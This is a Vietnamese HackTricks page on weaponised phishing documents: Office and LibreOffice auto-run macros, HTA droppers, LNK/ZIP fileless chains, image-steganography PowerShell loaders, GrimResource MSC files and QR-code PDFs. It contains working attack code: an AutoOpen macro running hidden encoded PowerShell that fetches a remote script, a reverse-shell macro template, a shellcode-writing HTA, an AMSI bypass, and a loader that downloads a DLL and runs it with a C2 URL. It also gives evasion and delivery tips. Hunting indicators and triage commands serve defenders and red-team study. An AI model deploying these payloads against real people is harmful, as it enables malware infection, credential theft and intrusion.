# Tệp và tài liệu phishing

{{#include ../../banners/hacktricks-training.md}}

## Tài liệu Office

Microsoft Word thực hiện xác thực dữ liệu tệp trước khi mở tệp. Việc xác thực dữ liệu được thực hiện bằng cách nhận dạng cấu trúc dữ liệu theo tiêu chuẩn OfficeOpenXML. Nếu xảy ra lỗi trong quá trình nhận dạng cấu trúc dữ liệu, tệp đang được phân tích sẽ không được mở.

Thông thường, các tệp Word chứa macro sử dụng phần mở rộng `.docm`. Tuy nhiên, bạn có thể đổi tên tệp bằng cách thay đổi phần mở rộng mà vẫn giữ khả năng thực thi macro.\
Ví dụ, theo thiết kế, tệp RTF không hỗ trợ macro, nhưng tệp DOCM được đổi tên thành RTF vẫn sẽ được Microsoft Word xử lý và có thể thực thi macro.\
Các cơ chế và thành phần nội bộ tương tự cũng áp dụng cho tất cả phần mềm thuộc bộ Microsoft Office (Excel, PowerPoint, v.v.).

Bạn có thể sử dụng lệnh sau để kiểm tra những phần mở rộng nào sẽ được một số chương trình Office thực thi:

```bash
assoc | findstr /i "word excel powerp"
```

Các file DOCX tham chiếu đến một template từ xa (File –Options –Add-ins –Manage: Templates –Go) có chứa macro cũng có thể “thực thi” macro.

### Tải ảnh bên ngoài

Vào: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, và **Filename or URL**:_ http://<ip>/whatever

![Tài liệu Office - Tải ảnh bên ngoài: Vào: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

Để phân tích tài liệu nhận được thay vì tạo tài liệu, xem [Phân tích VBA macro: mã rác và UserForms](../basic-forensic-methodology/specific-software-file-type-tricks/office-file-analysis.md#vba-macro-analysis-junk-code-and-userforms).

### Macro backdoor

Có thể dùng macro để chạy mã tùy ý từ tài liệu.

#### Hàm tự động tải

Chúng càng phổ biến thì AV càng có khả năng phát hiện.

- AutoOpen()
- Document_Open()

#### Ví dụ mã macro

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Xóa metadata thủ công

Vào **File > Info > Inspect Document > Inspect Document** để mở Document Inspector. Nhấp vào **Inspect**, sau đó nhấp **Remove All** bên cạnh **Document Properties and Personal Information**.

#### Phần mở rộng Doc

Khi hoàn tất, chọn menu thả xuống **Save as type**, đổi định dạng từ **`.docx`** sang Word 97-2003 **`.doc`**.\
Làm vậy vì bạn **không thể lưu macro bên trong tệp `.docx`** và phần mở rộng **`.docm`** hỗ trợ macro mang **tiếng xấu** (ví dụ: biểu tượng hình thu nhỏ có dấu `!` rất lớn và một số cổng web/email chặn hoàn toàn các tệp này). Vì vậy, **phần mở rộng `.doc` cũ là lựa chọn thỏa hiệp tốt nhất**.

#### Công cụ tạo Malicious Macros

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Macro tự chạy LibreOffice ODT (Basic)

Tài liệu LibreOffice Writer có thể nhúng macro Basic và tự động thực thi khi mở tệp bằng cách gán macro cho sự kiện **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Một macro reverse shell đơn giản trông như sau:

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Lưu ý dấu ngoặc kép kép (`""`) bên trong chuỗi – LibreOffice Basic dùng chúng để escape dấu ngoặc kép theo nghĩa đen, vì vậy các payload kết thúc bằng `...==""")` sẽ giữ cho cả lệnh bên trong lẫn đối số Shell được đóng đúng cách.

Mẹo gửi tệp:

- Lưu dưới dạng `.odt` và gán macro cho sự kiện của tài liệu để macro chạy ngay khi tài liệu được mở.
- Khi gửi email bằng `swaks`, hãy dùng `--attach @resume.odt` (bắt buộc phải có `@` để gửi byte của tệp, thay vì chuỗi tên tệp, dưới dạng tệp đính kèm). Điều này rất quan trọng khi khai thác các máy chủ SMTP chấp nhận người nhận `RCPT TO` bất kỳ mà không xác thực.

## Tệp HTA

HTA là một chương trình Windows **kết hợp HTML và các ngôn ngữ scripting (chẳng hạn như VBScript và JScript)**. Nó tạo giao diện người dùng và chạy như một ứng dụng "được tin cậy hoàn toàn", không bị giới hạn bởi mô hình bảo mật của trình duyệt.

HTA được thực thi bằng **`mshta.exe`**, thường được **cài đặt** cùng với **Internet Explorer**, khiến **`mshta` phụ thuộc vào IE**. Vì vậy, nếu IE đã bị gỡ cài đặt, HTA sẽ không thể chạy.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Thẻ tệp đính kèm giả trong email HTML

Email HTML có thể mô phỏng thẻ xem trước tệp đính kèm gốc của nhà cung cấp thay vì chứa tệp đính kèm thật. Talos đã quan sát thấy một thẻ Gmail được dựng lại từ bốn phần MIME PNG nội tuyến được mã hóa Base64. Toàn bộ thành phần trực quan được bọc trong một anchor, còn giá trị người nhận trong `?m=<target-id>` cho phép theo dõi từng người nhận. Liên kết bắt đầu bằng `//` thay vì `http://` hoặc `https://`; trình duyệt phân giải dạng URL tương đối theo giao thức này, nhưng các công cụ trích xuất URL chỉ khớp URL có giao thức đầy đủ có thể bỏ sót nó.<sup>[[11]](#references)</sup>

Trong quá trình phân tích, hãy kiểm tra MIME thô thay vì tin vào danh sách tệp đính kèm đã hiển thị. Dựng lại cách các phần hình ảnh nội tuyến tạo thành thẻ trực quan, xác định anchor bao quanh nó và chuẩn hóa các giá trị `href` tương đối theo giao thức trước khi trích xuất URL.<sup>[[11]](#references)</sup>

Để kiểm tra giả mạo người gửi ở cấp phong bì/header và căn chỉnh DMARC, xem [SMTP mail spoofing countermeasures](../../network-services-pentesting/pentesting-smtp/index.html#spf-pass-with-an-unaligned-visible-sender).

## Buộc xác thực NTLM

Có nhiều cách để **buộc xác thực NTLM từ xa**, ví dụ: bạn có thể thêm **hình ảnh vô hình** vào email hoặc HTML mà người dùng sẽ truy cập (thậm chí qua HTTP MitM?). Hoặc gửi cho nạn nhân **địa chỉ của các tệp** có thể **kích hoạt** **xác thực** chỉ bằng cách **mở thư mục**.

**Xem các ý tưởng này và nhiều nội dung khác trong những trang sau:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Đừng quên rằng bạn không chỉ có thể đánh cắp hash hoặc thông tin xác thực mà còn có thể **thực hiện các cuộc tấn công NTLM relay**:

- [**Các cuộc tấn công NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay đến chứng chỉ)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loader + Payload nhúng trong ZIP (chuỗi fileless)

Các chiến dịch có hiệu quả cao gửi một tệp ZIP chứa hai tài liệu mồi nhử hợp lệ (PDF/DOCX) và một tệp .lnk độc hại. Thủ thuật là PowerShell loader thực sự được lưu trong các byte thô của ZIP, sau một marker duy nhất, và .lnk trích xuất rồi chạy nó hoàn toàn trong bộ nhớ.<sup>[[2]](#references)</sup>

Luồng điển hình do lệnh PowerShell một dòng trong .lnk triển khai:

1) Tìm ZIP gốc trong các đường dẫn phổ biến: Desktop, Downloads, Documents, %TEMP%, %ProgramData% và thư mục cha của thư mục làm việc hiện tại.
2) Đọc các byte của ZIP và tìm marker được mã hóa cứng (ví dụ: xFIQCV). Mọi thứ sau marker là payload PowerShell được nhúng.
3) Sao chép ZIP vào %ProgramData%, giải nén tại đó và mở tệp mồi nhử .docx để trông có vẻ hợp pháp.
4) Bỏ qua AMSI cho tiến trình hiện tại: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Giải obfuscate stage tiếp theo (ví dụ: xóa tất cả ký tự #) và thực thi nó trong bộ nhớ.

Ví dụ khung PowerShell để trích xuất và chạy stage được nhúng:

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Ghi chú
- Khâu phân phối thường lợi dụng các subdomain PaaS có uy tín (ví dụ: *.herokuapp.com) và có thể giới hạn việc phân phối payload (phục vụ ZIP lành tính dựa trên IP/UA).
- Giai đoạn tiếp theo thường giải mã shellcode được mã hóa bằng base64/XOR rồi thực thi thông qua Reflection.Emit + VirtualAlloc để giảm thiểu dấu vết trên ổ đĩa.

Persistence được sử dụng trong cùng chuỗi
- Chiếm quyền COM TypeLib của điều khiển Microsoft Web Browser để IE/Explorer hoặc bất kỳ ứng dụng nào nhúng điều khiển này tự động khởi chạy lại payload.<sup>[[2]](#references)[[4]](#references)</sup> Xem chi tiết và các lệnh có thể sử dụng ngay tại đây:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Truy tìm/IOCs
- Các tệp ZIP có chứa chuỗi đánh dấu ASCII (ví dụ: xFIQCV) được nối vào dữ liệu archive.
- Tệp .lnk liệt kê các thư mục cha/người dùng để tìm ZIP rồi mở một tài liệu mồi.
- Can thiệp AMSI thông qua [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Các chuỗi email công việc kéo dài, kết thúc bằng liên kết được lưu trữ trên các domain PaaS đáng tin cậy.

## LNK staging ưu tiên decoy → persistence bằng scheduled task → side-loading CPL đáng tin cậy

Một pattern thường gặp khác là **`.lnk` giả dạng tài liệu**, lập tức mở một nội dung mồi lành tính trong khi âm thầm staging chuỗi thực thi phía sau.<sup>[[3]](#references)</sup>

Quy trình được quan sát:
1. Shortcut **giả dạng PDF** và dùng `conhost.exe` hoặc một proxy tương tự để khởi chạy trình tải xuống PowerShell bị làm rối.
2. PowerShell chia nhỏ các token dễ nhận diện (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) để các cơ chế phát hiện sơ sài tìm `iwr`, `gci`, `ren`, `cpi` hoặc `schtasks` không nhận ra lệnh.
3. Stager tải **tài liệu mồi trước**, mở tài liệu đó cho nạn nhân xem, rồi tái tạo các tệp độc hại trong nền.
4. Payload có thể được ghi bằng **phần mở rộng giả** rồi đổi tên bằng cách loại bỏ các ký tự đệm, trì hoãn thời điểm xuất hiện các artifact `.exe` / `.cpl` dễ nhận thấy.
5. Persistence được thiết lập bằng **scheduled task chạy theo phút**, khởi chạy một binary host đáng tin cậy từ đường dẫn mà người dùng có quyền ghi.

Các dấu hiệu truy tìm tối thiểu của pattern này:

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Một bố cục staging hữu ích cần nhận diện:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` hoặc `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Vì sao stage thứ hai khó bị phát hiện

Trong case study của Rapid7, scheduled task liên tục chạy **`Fondue.exe`** từ `C:\Users\Public\`. Vì **`APPWIZ.cpl`** được đặt cùng thư mục và export **`RunFODW`**, binary Microsoft đáng tin cậy đã side-load CPL của attacker thay vì bản hệ thống hợp lệ.

Sau đó, CPL:
- Đọc blob **AES-256-CBC** từ `C:\Windows\Tasks\editor.dat`
- Giải mã blob bằng **Windows CNG / `bcrypt.dll`**
- Cấp phát bộ nhớ có thể thực thi và sao chép shellcode đã giải mã vào đó
- Thực thi shellcode gián tiếp bằng cách truyền con trỏ đến shellcode làm callback cho **`EnumUILanguagesW`**

Bước cuối này đáng được săn tìm riêng: malware thường tránh lệnh nhảy trực tiếp `((void(*)())buf)()` và thay vào đó lạm dụng một **WinAPI hợp lệ nhận callback** để chuyển luồng thực thi.

Payload được giải mã trong chiến dịch này là shellcode **Donut**. Sau đó, payload ánh xạ PE cuối cùng hoàn toàn trong bộ nhớ và patch **AMSI/WLDP/ETW** trong process hiện tại trước khi chuyển giao luồng thực thi. Để xem ghi chú chuyên sâu hơn về side-loading và xử lý hậu kỳ trong bộ nhớ, hãy xem:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Các điểm pivot thực tế để săn tìm:
- `.lnk` khởi chạy `powershell.exe` hoặc `conhost.exe`, sau đó hiển thị một tài liệu mồi.
- Tệp được tải xuống `C:\Users\Public\` trong thời gian ngắn rồi lập tức được đổi tên từ các phần mở rộng vô nghĩa.
- Scheduled task có tên chung chung như `GoogleErrorReport`, thực thi từ **các thư mục mà user có quyền ghi**.
- Binary đáng tin cậy tải tệp **`.cpl` / `.dll`** từ cùng một thư mục không thuộc hệ thống.
- Blob văn bản Base64 được ghi vào **`C:\Windows\Tasks\`** rồi được module side-load đọc.

## Payload được phân tách bằng steganography trong ảnh (PowerShell stager)

Các chuỗi loader gần đây phân phối JavaScript/VBS đã được làm rối, giải mã rồi chạy PowerShell stager được mã hóa Base64. Stager này tải xuống một ảnh (thường là GIF) chứa một .NET DLL được mã hóa Base64 và ẩn dưới dạng văn bản thuần giữa các marker duy nhất ở đầu/cuối. Script tìm các delimiter này (ví dụ từng được thấy ngoài thực tế: «<<sudo_png>> … <<sudo_odt>>>»), trích xuất phần văn bản nằm giữa, giải mã Base64 thành byte, nạp assembly vào bộ nhớ rồi gọi một entry method đã biết cùng với URL C2.<sup>[[5]](#references)</sup>

Quy trình
- Stage 1: JS/VBS dropper trong tệp lưu trữ → giải mã Base64 được nhúng → khởi chạy PowerShell stager với -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → tải ảnh xuống, trích xuất Base64 được phân tách bằng marker, nạp .NET DLL vào bộ nhớ và gọi method của nó (ví dụ: VAI), truyền URL C2 và các tùy chọn.
- Stage 3: Loader lấy payload cuối cùng và thường inject payload đó bằng process hollowing vào một binary đáng tin cậy (thường là MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Xem thêm về process hollowing và thực thi proxy thông qua tiện ích đáng tin cậy tại đây:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Ví dụ PowerShell để trích xuất DLL từ ảnh và gọi một .NET method trong bộ nhớ:

<details>
<summary>PowerShell extractor và loader cho payload stego</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Lưu ý
- Đây là ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Marker khác nhau giữa các campaign.
- AMSI/ETW bypass và giải obfuscation chuỗi thường được áp dụng trước khi tải assembly.
- Săn tìm: quét các image đã tải xuống để tìm delimiter đã biết; xác định PowerShell truy cập image và giải mã ngay các blob Base64.

Xem thêm các công cụ stego và kỹ thuật carving:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → staging PowerShell Base64

Một initial stage thường gặp là tệp `.js` hoặc `.vbs` nhỏ, bị obfuscation mạnh và được phân phối bên trong một archive. Mục đích duy nhất của nó là giải mã chuỗi Base64 nhúng sẵn và khởi chạy PowerShell với `-nop -w hidden -ep bypass` để bootstrap stage tiếp theo qua HTTPS.<sup>[[5]](#references)</sup>

Logic khung (trừu tượng):
- Đọc nội dung tệp của chính nó
- Tìm blob Base64 nằm giữa các chuỗi rác
- Giải mã thành PowerShell ASCII
- Thực thi bằng `wscript.exe`/`cscript.exe` gọi `powershell.exe`

Dấu hiệu săn tìm
- Tệp đính kèm JS/VBS trong archive khởi chạy `powershell.exe` với `-enc`/`FromBase64String` trong command line.
- `wscript.exe` khởi chạy `powershell.exe -nop -w hidden` từ đường dẫn temp của người dùng.

## Tài liệu MSC làm container thực thi (GrimResource)

Tệp Microsoft Management Console (`.msc`) là các định nghĩa console XML thường được mở bằng `mmc.exe`. **GrimResource** vũ khí hóa tham chiếu `StringTable` tới một resource `apds.dll` chứa primitive XSS cũ, khiến JavaScript chạy bên trong `mmc.exe` khi người dùng mở console được tạo thủ công. Các mẫu đã quan sát kết hợp obfuscation dựa trên `transformNode` với **DotNetToJScript` để khởi tạo payload .NET mà không cần dùng đường dẫn macro Office thông thường.<sup>[[9]](#references)</sup>

Để phân loại tĩnh, hãy xem MSC không đáng tin cậy dưới dạng văn bản và **không** nhấp đúp vào tệp này:<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Các dấu hiệu runtime có giá trị cao gồm `mmc.exe` tải CLR hoặc các thành phần script, tạo kết nối mạng hoặc khởi chạy `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` hoặc một executable bất thường. Định dạng này hợp lệ, vì vậy các quy tắc phát hiện nên đối chiếu **nguồn gốc + nội dung XML/script đáng ngờ + hành vi của `mmc.exe`** thay vì chặn mọi MSC.<sup>[[9]](#references)</sup>

## PDF/mã QR chuyển hướng và kiểm soát phân phối payload

PDF không cần exploit để trở nên hữu ích. Các chiến dịch gần đây đặt **mã QR hoặc liên kết thông thường** trong một tài liệu trông có vẻ vô hại, chuyển phiên trình duyệt ra khỏi các biện pháp kiểm soát email và cá nhân hóa đích đến bằng địa chỉ người nhận. Microsoft đã ghi nhận các PDF năm 2025 có URL mã QR riêng cho từng người nhận và dẫn đến hạ tầng đánh cắp thông tin đăng nhập RaccoonO365; một chuỗi tấn công song song sử dụng cơ chế kiểm tra IP/môi trường để trả về đường dẫn JavaScript/MSI cho những khách truy cập được chọn, nhưng trả về PDF vô hại cho các trình quét hoặc client không được phép.<sup>[[10]](#references)</sup>

Phân loại cả các hành động trong PDF lẫn mã QR được hiển thị. Mã QR có thể được vẽ dưới dạng vector thay vì được lưu dưới dạng hình ảnh có thể trích xuất, vì vậy hãy raster hóa từng trang đồng thời trích xuất các hình ảnh được nhúng:

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Kiểm tra các đích đã giải mã và redirect từ một hệ thống phân tích cô lập mà không cần xác thực. Các đặc điểm hữu ích để săn tìm gồm PDF chỉ có QR với nội dung email gần như trống, email người nhận được nhúng trong tham số truy vấn, nhiều redirect qua các dịch vụ hosting uy tín và nội dung trả về khác nhau tùy theo IP, vị trí địa lý, cookie, referrer hoặc user agent. So sánh các request bằng những cấu hình được kiểm soát vì một lần sandbox fetch có thể chỉ nhận được nội dung mồi.<sup>[[10]](#references)</sup>

## Các file Windows dùng để đánh cắp NTLM hash

Xem trang về **các vị trí đánh cắp NTLM credential**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Chiến dịch ZipLine: Một cuộc tấn công phishing tinh vi nhắm vào các công ty Mỹ](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode: Theo dõi tradecraft của Dropping Elephant qua chuỗi loader theo chủ đề Trung Quốc](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – Kỹ thuật persistence COM mới (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader phân phối nhiều loại infostealer](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Proxy Execution qua tiện ích dành cho nhà phát triển đáng tin cậy: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console để truy cập ban đầu và né tránh](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Tác nhân đe dọa lợi dụng mùa khai thuế để triển khai các chiến dịch phishing theo chủ đề thuế](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – Chuỗi phát tán UAT-11587 và backdoor Antino](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
{{#include ../../banners/hacktricks-training.md}}
